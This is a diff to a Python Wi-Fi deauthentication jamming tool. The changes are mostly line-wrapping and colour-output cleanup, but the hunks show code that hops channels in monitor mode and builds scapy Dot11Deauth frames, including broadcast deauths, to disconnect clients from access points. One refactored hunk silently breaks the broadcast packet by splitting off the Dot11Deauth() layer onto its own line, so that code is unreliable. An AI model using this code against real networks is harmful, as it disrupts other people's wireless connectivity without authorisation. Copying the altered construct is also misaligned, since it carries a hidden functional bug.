@@ -180,8 +180,10 @@ def get_iface(interfaces):
     try:
         interface = max(scanned_aps)[1]
         if interfaces[interface] == 1:
-            raw_input(Colors.dash(Colors.red) + ' Disconnect ' + Colors.format_green(interface) +
-                      ' from its network or channel hopping will fail. When done hit [ENTER]')
+            raw_input(Colors.dash(Colors.red) + ' Disconnect ' +
+                      Colors.format_green(interface) + ' '
+                      'from its network or channel hopping will fail. '
+                      'When done hit [ENTER]')
         return interface
     except Exception as e:
         for iface in interfaces:
@@ -204,7 +206,7 @@ def start_mon_mode(interface):
 
 
 def remove_mon_iface():
-    proc = Popen(['airmon-ng', 'stop', mon_iface], stdout=PIPE, stderr=DN)
+    Popen(['airmon-ng', 'stop', mon_iface], stdout=PIPE, stderr=DN)
 
 
 def mon_mac(mon_iface):
@@ -226,8 +228,9 @@ def mon_mac(mon_iface):
 
 def channel_hop(mon_iface, args):
     '''
-    First time it runs through the channels it stays on each channel for 5 seconds
-    in order to populate the deauth list nicely. After that it goes as fast as it can
+    First time it runs through the channels it stays on each channel for 5
+    seconds in order to populate the deauth list nicely. After that it goes as
+    fast as it can
     '''
     global monchannel, first_pass
     channelNum = 0
@@ -267,8 +270,8 @@ def channel_hop(mon_iface, args):
 
 def deauth(monchannel):
     '''
-    addr1=destination, addr2=source, addr3=bssid, addr4=bssid of gateway if there's
-    multi-APs to one gateway. Constantly scans the clients_APs list and
+    addr1=destination, addr2=source, addr3=bssid, addr4=bssid of gateway if
+    there's multi-APs to one gateway. Constantly scans the clients_APs list and
     starts a thread to deauth each instance
     '''
     global first_pass
@@ -281,10 +284,11 @@ def deauth(monchannel):
                 client = x[0]
                 ap = x[1]
                 ch = x[2]
-                # Can't add a RadioTap() layer as the first layer or it's a malformed
+                # Can't add a RadioTap() layer as the first layer or it's a
+                # malformed
                 # Association request packet?
-                # Append the packets to a new list so we don't have to hog the lock
-                # type=0, subtype=12?
+                # Append the packets to a new list so we don't have to hog the
+                # lock type=0, subtype=12?
                 if ch == monchannel:
                     deauth_pkt1 = Dot11(
                         addr1=client, addr2=ap, addr3=ap) / Dot11Deauth()
@@ -299,8 +303,10 @@ def deauth(monchannel):
                     ap = a[0]
                     ch = a[1]
                     if ch == monchannel:
-                        deauth_ap = Dot11(
-                            addr1='ff:ff:ff:ff:ff:ff', addr2=ap, addr3=ap) / Dot11Deauth()
+                        deauth_ap = Dot11(addr1='ff:ff:ff:ff:ff:ff',
+                                          addr2=ap,
+                                          addr3=ap)
+                        Dot11Deauth()
                         pkts.append(deauth_ap)
 
     if len(pkts) > 0:
@@ -328,17 +334,20 @@ def output(err, monchannel):
     with lock:
         for ca in clients_APs:
             if len(ca) > 3:
-                print(Colors.star(Colors.Tan) + ' ' + Colors.Orange + ca[0] + Colors.white + ' - ' +
-                      Colors.Orange + ca[1] + Colors.white + ' - ' + ca[2].ljust(2) + ' - ' + Colors.Tan + ca[3] + Colors.white)
+                print(Colors.star(Colors.Tan) + ' ' +
+                      Colors.format_orange(ca[0]) + ' - ' +
+                      Colors.format_orange(ca[1]) + ' - ' + ca[2].ljust(2) +
+                      ' - ' + Colors.format_tan(ca[3]))
             else:
-                print(Colors.star(Colors.Tan) + ' ' + Colors.Orange + ca[0]
-                      + Colors.white + ' - ' + Colors.Orange + ca[1] + Colors.white + ' - ' + ca[2])
+                print(Colors.star(Colors.Tan) + ' ' +
+                      Colors.format_orange(ca[0]) + ' - ' +
+                      Colors.format_orange(ca[1]) + ' - ' + ca[2])
     if len(APs) > 0:
         print('\n      Access Points     ch   ESSID')
     with lock:
         for ap in APs:
-            print(Colors.star(Colors.Tan) + ' ' + Colors.Orange + ap[0] +
-                  Colors.white + ' - ' + ap[1].ljust(2) + ' - ' + Colors.Tan + ap[2] + Colors.white)
+            print(Colors.star(Colors.Tan) + ' ' + Colors.format_orange(ap[0]) +
+                  ' - ' + ap[1].ljust(2) + ' - ' + Colors.format_tan(ap[2]))
     print()
 
 
@@ -369,9 +378,9 @@ def cb(pkt):
     if args.skip:
         ignore.append(args.skip)
 
-    # We're adding the AP and channel to the deauth list at time of creation rather
-    # than updating on the fly in order to avoid costly for loops that require
-    # a lock
+    # We're adding the AP and channel to the deauth list at time of creation
+    # rather than updating on the fly in order to avoid costly for loops that
+    # require a lock
     if pkt.haslayer(Dot11):
         if pkt.addr1 and pkt.addr2:
             if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
@@ -396,7 +405,7 @@ def APs_add(clients_APs, APs, pkt):
         chans = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11']
         if ap_channel not in chans:
             return
-    except Exception as e:
+    except Exception:
         return
 
     if len(APs) == 0:
@@ -411,6 +420,7 @@ def APs_add(clients_APs, APs, pkt):
 
 
 def clients_APs_add(clients_APs, addr1, addr2):
+    global monchannel
     if len(clients_APs) == 0:
         if len(APs) == 0:
             with lock:
